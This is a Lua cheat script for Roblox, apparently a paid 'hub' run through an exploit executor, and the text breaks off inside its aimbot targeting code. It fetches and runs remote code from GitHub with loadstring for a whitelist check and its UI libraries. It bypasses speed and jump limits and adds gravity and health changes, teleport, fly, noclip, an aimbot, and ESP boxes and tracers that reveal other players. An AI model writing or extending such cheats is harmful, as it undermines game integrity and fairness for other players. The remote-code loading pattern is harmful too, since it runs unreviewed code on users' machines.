--meetly hub
local whitelistecheck = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheLariska/Base-acc/main/README.md", true))()

if whitelistecheck[game:service('Players').LocalPlayer.UserId] then



print("Script Load! (by Meetly)")

game.StarterGui:SetCore(
"SendNotification",
{
Title = "Made by Robojini",
Text = "WhiteList check!"
}
)

game.StarterGui:SetCore(
"SendNotification",
{
Title = "Discord",
Text = "TheMeetly#0885"
}
)

game.StarterGui:SetCore(
"SendNotification",
{
Title = "Coding helper",
Text = "Robojini#1524"
}
)

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Robojini/Tuturial_UI_Library/main/UI_Template_1"))()
 
local Window = Library.CreateLib("MEETLY HUB PREMIUM", "RJTheme7")
 
local Tab = Window:NewTab("Main")
 
local Section = Tab:NewSection("Hack to Player")

Section:NewButton("Default Gravity", "-", function()
wait()
game.workspace.Gravity = 192.2
end)

Section:NewButton("Average Gravity", "-", function()
wait()
game.workspace.Gravity = 70
end)
 
Section:NewButton("low Gravity", "-", function()
wait()
game.workspace.Gravity = 20
end)
 
Section:NewButton("Super low Gravity", "-", function()
wait()
game.workspace.Gravity = 5
end)

Section:NewSlider("Gravity slider","-", 192, 1, function(s)
wait()
game.workspace.Gravity = s
end)

Section:NewButton("full hp", "-", function()
game.Players.LocalPlayer.Character.Humanoid.Health = 100
end)

Section:NewKeybind("full hp (bind)", "-", Enum.KeyCode.F, function()
game.Players.LocalPlayer.Character.Humanoid.Health = 100
end)

Section:NewToggle("Disabler AntiWalkSpeed", "wait 0.4 second", function(state)
    if state then
game:GetService("RunService").RenderStepped:wait() do
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150
end
    else
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 17.3
    end
end)

Section:NewToggle("Disabler AntiJumpPower", "wait 1 second", function(state)
    if state then
game:GetService("RunService").RenderStepped:wait() do
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150
end
    else
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
    end
end)

Section:NewButton("CFrame Speed (Z)", "ButtonInfo", function()
    repeat
    wait()
until game:IsLoaded()
local L_134_ = game:service('Players')
local L_135_ = L_134_.LocalPlayer
repeat
    wait()
until L_135_.Character
local L_136_ = game:service('UserInputService')
local L_137_ = game:service('RunService')
getgenv().Multiplier = 0.5
local L_138_ = true
local L_139_
L_136_.InputBegan:connect(function(L_140_arg0)
    if L_140_arg0.KeyCode == Enum.KeyCode.LeftBracket then
        Multiplier = Multiplier + 0.01
        print(Multiplier)
        wait(0.2)
        while L_136_:IsKeyDown(Enum.KeyCode.LeftBracket) do
            wait()
            Multiplier = Multiplier + 0.01
            print(Multiplier)
        end
    end
    if L_140_arg0.KeyCode == Enum.KeyCode.RightBracket then
        Multiplier = Multiplier - 0.01
        print(Multiplier)
        wait(0.2)
        while L_136_:IsKeyDown(Enum.KeyCode.RightBracket) do
            wait()
            Multiplier = Multiplier - 0.01
            print(Multiplier)
        end
    end
    if L_140_arg0.KeyCode == Enum.KeyCode.Z then
        L_138_ = not L_138_
        if L_138_ == true then
            repeat
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Multiplier
                game:GetService("RunService").Stepped:wait()
            until L_138_ == false
        end
    end
end)
end)

Section:NewButton("KT LEAVE", "tp", function()
wait()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-945, 888, -2979)
end)

Section:NewButton("KT LEAVE 2 (M)","Teleport KT", function()
wait()
local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/miroeramaa/TurtleLib/main/TurtleUiLib.lua"))()
local window1 = library:Window("KT LEAVE Create meetly")
 
window1:Button("KT LEAVE",function()
local _speed=450
function tp(...)
   local plr=game.Players.LocalPlayer
   local args={...}
   if typeof(args[1])=="number"and args[2]and args[3]then
      args=Vector3.new(args[1],args[2],args[3])
   elseif typeof(args[1])=="Vector3" then
       args=args[1]    
   elseif typeof(args[1])=="CFrame" then
       args=args[1].Position
   end
   local dist=(plr.Character.HumanoidRootPart.Position-args).Magnitude
   game:GetService("TweenService"):Create(
       plr.Character.HumanoidRootPart,
       TweenInfo.new(dist/_speed,Enum.EasingStyle.Linear),
       {CFrame=CFrame.new(args)}
   ):Play()
end
 
 
tp(-945, 119, -2979)
end)
end)

Section:NewToggle("Freeze (M)", "freeze you humanoid", function(ez)
    if ez then
       game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
    else
       game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
end
end)

Section:NewToggle("Vclip up [double tap] (M)", "2 tap", function(state)
    if state then
       game.Players.LocalPlayer.Character.Humanoid.HipHeight = 40
    else
       game.Players.LocalPlayer.Character.Humanoid.HipHeight = 2
end
end)

Section:NewToggle("Vclip up 2 [double tap] (M)", "2 tap", function(state)
    if state then
       game.Players.LocalPlayer.Character.Humanoid.HipHeight = 40
    else
       game.Players.LocalPlayer.Character.Humanoid.HipHeight = 0
end
end)

Section:NewSlider("Speed", "Speed", 1000, 16, function(s) -- 1000 (Макс. значение) | 16 (Мин. значение)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)
 
Section:NewSlider("JumpPower", "JumpPower", 1000, 50, function(s) -- 1000 (Макс. значение) | 50 (Мин. значение)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = s
end)

Section:NewButton("GlideFly", "fly bypass", function()
wait()
togglekey = "b"  -- fly toggle
upkey = "="      -- makes speed faster
downkey = "-"    -- makes speed slower
enablepart = "u" -- enables part fly
speed = -0.5     -- changes set speed
updown = false   -- true if you want to go up
notify = true    -- true if you want notifcations
flypart = true   -- true for part fly
local user = game:GetService("UserInputService")
local player = game:GetService("Players").LocalPlayer
local GuiService = game:GetService("StarterGui")
local mouse = game.Players.LocalPlayer:GetMouse()
local holdingWKey = false
local holdingSKey = false
local holdingAKey = false
local holdingDKey = false
local holdingSpaceKey = false
local holdingShiftKey = false
local check = false
GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Script made by Zurewrath";})
mouse.KeyDown:connect(function(key)
   if key == enablepart then
       if flypart then
           flypart = false
           if notify then
               GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Disabled part fly";})
           end
       else
           flypart = true
           if notify then
               GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Enabled part fly";})
           end
       end
   end
end)
mouse.KeyDown:connect(function(key)
   if key == upkey then
       speed = speed + -0.1
       if notify then
           GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Speed is now set to " .. speed;})
       end
   end
end)
mouse.KeyDown:connect(function(key)
   if key == downkey then
       speed = speed - -0.1
       if notify then
           GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Speed is now set to " .. speed;})
       end
   end
end)
mouse.KeyDown:connect(function(key)
   if key == togglekey then
       if check  == true then
           check = false
           if notify then
               GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Speed is now disabled";})
           end
           game.Workspace.fly:Destroy()
       else
           check = true
           if notify then
               GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Speed is now enabled";})
           end
           if flypart then
               local brick = Instance.new("Part", workspace)
               brick.Size = Vector3.new(8, 2, 8)
               brick.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
               brick.Transparency = 1 brick.Anchored = true brick.Name = "fly"
               game:GetService('RunService').Stepped:connect(function()
                   brick.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
                   brick.Size = Vector3.new(8+-speed, 2, 8+-speed)
               end)
           end
       end
   end
end)
game:GetService('RunService').Stepped:connect(function()
   if check then
       if holdingWKey == true then
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,speed)
       end
       if holdingSKey == true then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-speed)
   end
       if holdingAKey == true then
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(speed,0,0)
   end
       if holdingDKey == true then
   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(-speed,0,0)
       end
       if holdingShiftKey == true then
           game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,speed,0)
       end
       if updown then
           if holdingSpaceKey == true then
               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-speed,0)
           end
       end
   end
end)
user.InputBegan:Connect(function(inputObject)
   if (inputObject.KeyCode == Enum.KeyCode.W) then
       holdingWKey = true
   end
   if (inputObject.KeyCode == Enum.KeyCode.S) then
       holdingSKey = true
   end
   if (inputObject.KeyCode == Enum.KeyCode.A) then
       holdingAKey = true
   end
   if (inputObject.KeyCode == Enum.KeyCode.D) then
       holdingDKey = true
   end
   if (inputObject.KeyCode == Enum.KeyCode.LeftControl) then
       holdingShiftKey = true
   end
   if (inputObject.KeyCode == Enum.KeyCode.Space) then
       holdingSpaceKey = true
   end
end)
user.InputEnded:Connect(function(inputObject)
   if (inputObject.KeyCode == Enum.KeyCode.W) then
       holdingWKey = false
   end
   if( inputObject.KeyCode == Enum.KeyCode.S) then
       holdingSKey = false
   end
   if (inputObject.KeyCode == Enum.KeyCode.A) then
       holdingAKey = false
   end
   if (inputObject.KeyCode == Enum.KeyCode.D) then
       holdingDKey = false
   end
   if (inputObject.KeyCode == Enum.KeyCode.LeftControl) then
       holdingShiftKey = false
   end
   if (inputObject.KeyCode == Enum.KeyCode.Space) then
       holdingSpaceKey = false
   end
end)
end)
 
Section:NewButton("Noclip gui (M)", "passage through walls", function()
wait()
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local Noclip = Instance.new("ScreenGui")
local BG = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Toggle = Instance.new("TextButton")
local StatusPF = Instance.new("TextLabel")
local Status = Instance.new("TextLabel")
local Credit = Instance.new("TextLabel")
local Plr = Players.LocalPlayer
local Clipon = false
 
Noclip.Name = "Noclip"
Noclip.Parent = game.CoreGui
 
BG.Name = "BG"
BG.Parent = Noclip
BG.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
BG.BorderColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
BG.BorderSizePixel = 2
BG.Position = UDim2.new(0.149479166, 0, 0.82087779, 0)
BG.Size = UDim2.new(0, 210, 0, 127)
BG.Active = true
BG.Draggable = true
 
Title.Name = "Title"
Title.Parent = BG
Title.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Title.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Title.BorderSizePixel = 2
Title.Size = UDim2.new(0, 210, 0, 33)
Title.Font = Enum.Font.Highway
Title.Text = "Noclip"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.FontSize = Enum.FontSize.Size32
Title.TextSize = 30
Title.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Title.TextStrokeTransparency = 0
 
Toggle.Parent = BG
Toggle.BackgroundColor3 = Color3.new(0.266667, 0.00392157, 0.627451)
Toggle.BorderColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.BorderSizePixel = 2
Toggle.Position = UDim2.new(0.152380958, 0, 0.374192119, 0)
Toggle.Size = UDim2.new(0, 146, 0, 36)
Toggle.Font = Enum.Font.Highway
Toggle.FontSize = Enum.FontSize.Size28
Toggle.Text = "Toggle"
Toggle.TextColor3 = Color3.new(1, 1, 1)
Toggle.TextSize = 25
Toggle.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Toggle.TextStrokeTransparency = 0
 
StatusPF.Name = "StatusPF"
StatusPF.Parent = BG
StatusPF.BackgroundColor3 = Color3.new(1, 1, 1)
StatusPF.BackgroundTransparency = 1
StatusPF.Position = UDim2.new(0.314285725, 0, 0.708661377, 0)
StatusPF.Size = UDim2.new(0, 56, 0, 20)
StatusPF.Font = Enum.Font.Highway
StatusPF.FontSize = Enum.FontSize.Size24
StatusPF.Text = "Status:"
StatusPF.TextColor3 = Color3.new(1, 1, 1)
StatusPF.TextSize = 20
StatusPF.TextStrokeColor3 = Color3.new(0.333333, 0.333333, 0.333333)
StatusPF.TextStrokeTransparency = 0
StatusPF.TextWrapped = true
 
Status.Name = "Status"
Status.Parent = BG
Status.BackgroundColor3 = Color3.new(1, 1, 1)
Status.BackgroundTransparency = 1
Status.Position = UDim2.new(0.580952346, 0, 0.708661377, 0)
Status.Size = UDim2.new(0, 56, 0, 20)
Status.Font = Enum.Font.Highway
Status.FontSize = Enum.FontSize.Size14
Status.Text = "off"
Status.TextColor3 = Color3.new(0.666667, 0, 0)
Status.TextScaled = true
Status.TextSize = 14
Status.TextStrokeColor3 = Color3.new(0.180392, 0, 0.431373)
Status.TextWrapped = true
Status.TextXAlignment = Enum.TextXAlignment.Left
 
Credit.Name = "Credit"
Credit.Parent = BG
Credit.BackgroundColor3 = Color3.new(1, 1, 1)
Credit.BackgroundTransparency = 1
Credit.Position = UDim2.new(0.195238099, 0, 0.866141737, 0)
Credit.Size = UDim2.new(0, 128, 0, 17)
Credit.Font = Enum.Font.SourceSans
Credit.FontSize = Enum.FontSize.Size18
Credit.Text = "Created by Meetly"
Credit.TextColor3 = Color3.new(1, 1, 1)
Credit.TextSize = 16
Credit.TextStrokeColor3 = Color3.new(0.196078, 0.196078, 0.196078)
Credit.TextStrokeTransparency = 0
Credit.TextWrapped = true
 
Toggle.MouseButton1Click:connect(function()
    if Status.Text == "off" then
        Clipon = true
        Status.Text = "on"
        Status.TextColor3 = Color3.new(0,185,0)
        Stepped = game:GetService("RunService").Stepped:Connect(function()
            if not Clipon == false then
                for a, b in pairs(Workspace:GetChildren()) do
                if b.Name == Plr.Name then
                for i, v in pairs(Workspace[Plr.Name]:GetChildren()) do
                if v:IsA("BasePart") then
                v.CanCollide = false
                end end end end
            else
                Stepped:Disconnect()
            end
        end)
    elseif Status.Text == "on" then
        Clipon = false
        Status.Text = "off"
        Status.TextColor3 = Color3.new(170,0,0)
    end
end)
end)

Section:NewButton("AimBot GUI", "-", function()
wait()
    -- Yes, I know This Is Shit.
    local PLAYER = game.Players.LocalPlayer
    local CurrentCam  = game.Workspace.CurrentCamera
    local UIS = game:GetService("UserInputService")-- Made By Mick Gordon
    local WorldToViewportPoint = CurrentCam.WorldToViewportPoint
    local mouseLocation = UIS.GetMouseLocation
    
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Made By Mick Gordon", Text = "Enjoy !"})
    
    local DeleteMob ={
        GUi = {
            OpenNCloseButton = true; -- Have A Button For It
            KeybindEnable = false; -- If You Want A Bind For The Menu
            Keybind = "z"; -- Menu Key Bind
        };
        Aimbot= {
            Keybind = "MouseButton2"; -- Change Aim Bot Key Bind Here !!! No Capitals, Unless it is MouseButton1 or MouseButton2
    ------------------------------------------------------------------------------------------
            Enabled = false; -- No Need To Change Anything Here As It Is On The GUI
            TeamCheck = false;
            WallCheck = false;
            ShowFov = false;
            Fov = 0;
            Smoothing = 0;
            AimPart = "Head";
            Thickness = 1;
            FovFillColor = Color3.fromRGB(100,0,100);
            FovColor = Color3.fromRGB(100,0,100);
            FovFillTransparency = 1;
            FovTransparenct = 0;
            IsAimKeyDown = false;
        };
        ESP ={
            Box = {
                Box = false;
                Name = false;
                Distance = false;
                Health = false;
    
                TeamCheck = false;
    
                HealthType = "Bar";
    
                BoxColor = Color3.fromRGB(75,0,10);
            };
            OutLines = {
                Enabled = false;
                TeamCheck = false;
                TeamColor = false;
    
                AllwaysShow = true;
    
                FillCollor = Color3.fromRGB(75,0,10);
                FillTrancparenct = 0;
    
                OutlineColor = Color3.fromRGB(0,0,0);
                OutlineTrancparency = 0;
            };
            Tracers = {
                Enabled = false;
                TeamCheck = false;
                TeamColor = false;
    
                Color = Color3.fromRGB(75,0,10);
            }
        }-- Made By Mick Gordon
    }
    
    -- Made By Mick Gordon
    local Fov = Instance.new("ScreenGui")Fov.Name = "Fov" Fov.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") Fov.ZIndexBehavior = Enum.ZIndexBehavior.Sibling Fov.ResetOnSpawn = false-- i miss you synapse fov
    local TracersG = Instance.new("ScreenGui")TracersG.Name = "Tracers" TracersG.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") TracersG.ZIndexBehavior = Enum.ZIndexBehavior.Sibling TracersG.ResetOnSpawn = false
    local FOVFFrame = Instance.new("Frame")FOVFFrame.Parent = Fov FOVFFrame.Name = "FOVFFrame" FOVFFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255) FOVFFrame.BorderColor3 = Color3.fromRGB(0, 0, 0) FOVFFrame.BorderSizePixel = 0 FOVFFrame.BackgroundTransparency = 1 FOVFFrame.AnchorPoint = Vector2.new(0.5, 0.5) FOVFFrame.Position = UDim2.new(0.5, 0,0.5, 0) FOVFFrame.Size = UDim2.new(0, DeleteMob.Aimbot.Fov, 0, DeleteMob.Aimbot.Fov) FOVFFrame.BackgroundTransparency = 1 
    local UICorner = Instance.new("UICorner")UICorner.CornerRadius = UDim.new(1, 0) UICorner.Parent = FOVFFrame -- Made By Mick Gordon
    local UIStroke = Instance.new("UIStroke")UIStroke.Color = Color3.fromRGB(100,0,100) UIStroke.Parent = FOVFFrame UIStroke.Thickness = 1 UIStroke.ApplyStrokeMode = "Border" game:GetService("StarterGui"):SetCore("SendNotification", {Title = "https://discord.gg/FsApQ7YNTq", Text = "The Discord For More!"})
    local BoxC = Instance.new("ScreenGui", game.Workspace) BoxC.Name = "Box"
    local Higlight = Instance.new("ScreenGui",game.Workspace)
    local connections = {}
    -- Made By Mick Gordon
    local function AddHighlight(plr)
        local Highlight = Instance.new("Highlight")
        Highlight.Parent = Higlight
        Highlight.Name = plr.Name
        Highlight.Enabled = DeleteMob.ESP.OutLines.Enabled
        local plrchar = plr.Character
        if plrchar then
            Highlight.Adornee = plrchar
        end
        connections[plr] = plr.CharacterAdded:Connect(function(char)
            Highlight.Adornee = char
        end)
        local co = coroutine.create(function()
            while wait(.1) do
                if plr ~= PLAYER and plr and plr.Character and plr.Character.FindFirstChild(plr.Character, "Humanoid") and plr.Character.Humanoid.Health > 0 then
    
                    if DeleteMob.ESP.OutLines.Enabled == true then
                        if DeleteMob.ESP.OutLines.TeamCheck == true and plr.TeamColor == PLAYER.TeamColor then
                            Highlight.Enabled = false
                        else
                            Highlight.Enabled = true
                        end
                    else-- Made By Mick Gordon
                        Highlight.Enabled = false
                    end
    
                    if DeleteMob.ESP.OutLines.TeamColor == true then
                        Highlight.FillColor = plr.TeamColor.Color 
                    else
                        Highlight.FillColor = DeleteMob.ESP.OutLines.FillCollor
                    end
    
                    if DeleteMob.ESP.OutLines.AllwaysShow == true then
                        Highlight.DepthMode = "AlwaysOnTop" 
                    else
                        Highlight.DepthMode = "Occluded" 
                    end-- Made By Mick Gordon
    
                    Highlight.OutlineTransparency = DeleteMob.ESP.OutLines.OutlineTrancparency
                    Highlight.OutlineColor = DeleteMob.ESP.OutLines.OutlineColor
                    Highlight.FillTransparency = DeleteMob.ESP.OutLines.FillTrancparenct
    
                    if not (game:GetService"Players":FindFirstChild(plr.Name)) then
                        Higlight:FindFirstChild(plr.Name):Destroy()
                        coroutine.yield()
                    end
                else
                    Highlight.Enabled = false
                end
            end
        end)
        coroutine.resume(co)
    end
    -- Made By Mick Gordon
    local function AddBox(player) -- Saves FPS 
        local bbg = Instance.new("BillboardGui", BoxC)
        bbg.Name = player.Name
        bbg.AlwaysOnTop = true
        bbg.Size = UDim2.new(4,0,5.4,0)
        bbg.ClipsDescendants = false
        bbg.Enabled = false
    
        local outlines = Instance.new("Frame", bbg)
        outlines.Size = UDim2.new(1,0,1,0)
        outlines.BorderSizePixel = 1
        outlines.BackgroundTransparency = 1
        local left = Instance.new("Frame", outlines)
        left.BorderSizePixel = 1
        left.Size = UDim2.new(0,(1),1,0)
        local right = left:Clone()
        right.Parent = outlines
        right.Size = UDim2.new(0,-(1),1,0)   
        right.Position = UDim2.new(1,0,0,0)
        local up = left:Clone()-- Made By Mick Gordon
        up.Parent = outlines
        up.Size = UDim2.new(1,0,0,(1))
        local down = left:Clone()
        down.Parent = outlines
        down.Size = UDim2.new(1,0,0,-(1))
        down.Position = UDim2.new(0,0,1,0)
    
        local info = Instance.new("BillboardGui", bbg)
        info.Name = "info"
        info.Size = UDim2.new(3,0,0,54)
        info.StudsOffset = Vector3.new(3.6,-3,0)
        info.AlwaysOnTop = true
        info.ClipsDescendants = false
        info.Enabled = false
        local namelabel = Instance.new("TextLabel", info)
        namelabel.Name = "namelabel"
        namelabel.BackgroundTransparency = 1
        namelabel.TextStrokeTransparency = 0
        namelabel.TextXAlignment = Enum.TextXAlignment.Left
        namelabel.Size = UDim2.new(0,100,0,18)
        namelabel.Position = UDim2.new(0,0,0,0)
        namelabel.Text = player.Name
        local distancel = Instance.new("TextLabel", info)
        distancel.Name = "distancelabel"
        distancel.BackgroundTransparency = 1-- Made By Mick Gordon
        distancel.TextStrokeTransparency = 0
        distancel.TextXAlignment = Enum.TextXAlignment.Left
        distancel.Size = UDim2.new(0,100,0,18)
        distancel.Position = UDim2.new(0,0,0,18)
        local healthl = Instance.new("TextLabel", info)
        healthl.Name = "healthlabel"
        healthl.BackgroundTransparency = 1
        healthl.TextStrokeTransparency = 0
        healthl.TextXAlignment = Enum.TextXAlignment.Left
        healthl.Size = UDim2.new(0,100,0,18)
        healthl.Position = UDim2.new(0,0,0,36)
    
        local uill = Instance.new("UIListLayout", info)
    
        local forhealth = Instance.new("BillboardGui", bbg)
        forhealth.Name = "forhealth"
        forhealth.Size = UDim2.new(4.5,0,6,0)
        forhealth.AlwaysOnTop = true
        forhealth.ClipsDescendants = false
        forhealth.Enabled = false
    
        local healthbar = Instance.new("Frame", forhealth)
        healthbar.Name = "healthbar"
        healthbar.BackgroundColor3 = Color3.fromRGB(40,40,40)
        healthbar.BorderColor3 = Color3.fromRGB(0,0,0)
        healthbar.Size = UDim2.new(0.04,0,0.9,0)
        healthbar.Position = UDim2.new(0,0,0.05,0)
        local bar = Instance.new("Frame", healthbar)
        bar.Name = "bar"
        bar.BorderSizePixel = 0
        bar.BackgroundColor3 = Color3.fromRGB(94,255,69)
        bar.AnchorPoint = Vector2.new(0,1)
        bar.Position = UDim2.new(0,0,1,0)
        bar.Size = UDim2.new(1,0,1,0)
    
        -- Made By Mick Gordon
        local co = coroutine.create(function()
            while wait(0.1) do
                if player ~= PLAYER and player and player.Character and player.Character.FindFirstChild(player.Character, "Humanoid") and player.Character.Humanoid.Health > 0 then
                    bbg.Adornee = player.Character.HumanoidRootPart
                    info.Adornee = player.Character.HumanoidRootPart
                    forhealth.Adornee = player.Character.HumanoidRootPart
    
                    if DeleteMob.ESP.Box.Box == true then
                        outlines.Visible = true
                    else
                        outlines.Visible = false
                    end
    
                    outlines.BackgroundTransparency = 1
    
                    if DeleteMob.ESP.Box.Health == true then
                        if player.Character:FindFirstChild("Humanoid") ~= nil then
                            healthl.Text = "Health: "..math.floor(player.Character:FindFirstChild"Humanoid".Health)
                            healthbar.bar.Size = UDim2.new(1,0,player.Character:FindFirstChild"Humanoid".Health/player.Character:FindFirstChild"Humanoid".MaxHealth,0)
                        end
                        if DeleteMob.ESP.Box.HealthType == "Text" then
                            healthbar.Visible = false
                            healthl.Visible = true
                        end-- Made By Mick Gordon
                        if DeleteMob.ESP.Box.HealthType == "Bar" then
                            healthl.Visible = false
                            healthbar.Visible = true
                        end
                        if DeleteMob.ESP.Box.HealthType == "Both" then
                            healthl.Visible = true
                            healthbar.Visible = true
                        end
                    else
                        healthl.Visible = false
                        healthbar.Visible = false
                    end
    
    
                    if DeleteMob.ESP.Box.Name then
                        namelabel.Visible = true
                    else
                        namelabel.Visible = false
                    end
    
                    -- Made By Mick Gordon
                    if DeleteMob.ESP.Box.Distance == true then
                        distancel.Visible = true
                        if PLAYER.Character and PLAYER.Character:FindFirstChild("HumanoidRootPart") ~= nil then
                            distancel.Text = "Distance: "..math.floor(0.5+(PLAYER.Character:FindFirstChild"HumanoidRootPart".Position - player.Character:FindFirstChild"HumanoidRootPart".Position).magnitude)
                        end
                    else
                        distancel.Visible = false
                    end
    
    
                    if DeleteMob.ESP.Box.TeamCheck == true and player.TeamColor == PLAYER.TeamColor then
                        bbg.Enabled = false
                        info.Enabled = false
                        forhealth.Enabled = false
                    else
                        bbg.Enabled = true
                        info.Enabled = true
                        forhealth.Enabled = true
                    end
                    -- Made By Mick Gordon
    
                    if DeleteMob.ESP.Box.TeamColor == true then
                        left.BackgroundColor3 = player.TeamColor.Color
                        right.BackgroundColor3 = player.TeamColor.Color
                        up.BackgroundColor3 = player.TeamColor.Color
                        down.BackgroundColor3 = player.TeamColor.Color
                        outlines.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                    else
                        outlines.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                        left.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                        right.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                        up.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                        down.BackgroundColor3 = DeleteMob.ESP.Box.BoxColor
                        healthl.TextColor3 = DeleteMob.ESP.Box.BoxColor
                        distancel.TextColor3 = DeleteMob.ESP.Box.BoxColor
                        namelabel.TextColor3 = DeleteMob.ESP.Box.BoxColor
                    end
    
                    if not (game:GetService"Players":FindFirstChild(player.Name)) then
                        BoxC:FindFirstChild(player.Name):Destroy()
                        coroutine.yield()
                    end-- Made By Mick Gordon
                else
                    bbg.Enabled = false
                    bbg.Adornee = nil
                    info.Adornee = nil
                    info.Enabled = false
                    forhealth.Adornee = nil
                    forhealth.Enabled = false
                end
            end 
        end)
        coroutine.resume(co)
    end
    
    
    local function AddTracers(Player) -- Tracers Without Lib OMG !!!!
        local tracer = Instance.new("Frame") -- Idk What I Was Smoking When Making This Scrip Hub, It Is Shit And I Will Remake Later 
        tracer.Parent = TracersG
        tracer.Name = Player.Name
        tracer.Active = false
        tracer.AnchorPoint = Vector2.new(.5, .5)
        tracer.Visible = false
    
        local co = coroutine.create(function()
            game:GetService("RunService").RenderStepped:Connect(function()
                if Player ~= PLAYER and Player and Player.Character and Player.Character.FindFirstChild(Player.Character, "Humanoid") and Player.Character.Humanoid.Health > 0 then
                    local TargetPart = Player.Character:FindFirstChild("HumanoidRootPart")
                    local ScreenPoint, OnScreen = CurrentCam:WorldToScreenPoint(TargetPart.Position)
                    local distance 
                    -- Made By Mick Gordon
                    distance = math.floor(0.5+(game.Workspace.CurrentCamera.CFrame.Position - Player.Character:WaitForChild("HumanoidRootPart").Position).magnitude)
    
                    local screenpointmain = Vector2.new(ScreenPoint.X, ScreenPoint.Y + (2500 / distance)) --  / distance so it can be at the bottom of the box.
                    local posd = UIS:GetMouseLocation()
                    local MouseOrigin = Vector2.new(posd.X, posd.Y - 36)
                    local Origin = Vector2.new(CurrentCam.ViewportSize.X/2, CurrentCam.ViewportSize.Y - 1)
                    local Position = (Origin + screenpointmain) / 2
                    local Length = (Origin - screenpointmain).Magnitude
                    tracer.Rotation = math.deg(math.atan2(screenpointmain.Y - Origin.Y, screenpointmain.X - Origin.X))
    
    
                    Position = (Origin + screenpointmain) / 2
                    Length = (Origin - screenpointmain).Magnitude
                    tracer.Rotation = math.deg(math.atan2(screenpointmain.Y - Origin.Y, screenpointmain.X - Origin.X))
    
    
                    if OnScreen then
                        if DeleteMob.ESP.Tracers.Enabled == true and OnScreen then
                            if DeleteMob.ESP.Tracers.TeamCheck == true then
                                if Player.TeamColor == PLAYER.TeamColor then
                                    tracer.Visible = false
                                else
                                    tracer.Visible = true
                                end
                            else -- Made By Mick Gordon
                                tracer.Visible = true
                            end
                        else
                            tracer.Visible = false
                        end-- Made By Mick Gordon
    
                        if DeleteMob.ESP.Tracers.TeamColor == true then
                            tracer.BackgroundColor3 = Player.TeamColor.Color
                        else
                            tracer.BackgroundColor3 = DeleteMob.ESP.Tracers.Color
                        end
    
                        tracer.BorderColor3 = Color3.fromRGB(27, 42, 53)
                        tracer.Position = UDim2.new(0, Position.X, 0, Position.Y)
                        tracer.Size = UDim2.new(0, Length, 0, 2)
                    else
                        tracer.Visible = false
                    end
    
                    if not (game:GetService"Players":FindFirstChild(Player.Name)) then
                        Fov:FindFirstChild(Player.Name):Destroy()
                        coroutine.yield()
                    end
                else
                    tracer.Visible = false
                end
            end)
        end)
        coroutine.resume(co)-- Made By Mick Gordon
    end
    
    function isVisible(p, ...)
        
        if not (DeleteMob.Aimbot.WallCheck == true) then
            return true
        end
        
        return #CurrentCam:GetPartsObscuringTarget({ p }, { CurrentCam, PLAYER.Character, ... }) == 0 
    end-- Made By Mick Gordon
    
    function CameraGetClosestToMouse(Fov)
        local AimFov = Fov
        local targetPos = nil
    
        for i,v in pairs (game:GetService("Players"):GetPlayers()) do
            if v ~= PLAYER then
                if DeleteMob.Aimbot.TeamCheck == true then
                    if v.Character and v.Character:FindFirstChild(DeleteMob.Aimbot.AimPart) and v.Character.Humanoid and v.Character.Humanoid.Health > 0 and not (v.Team == PLAYER.Team) then
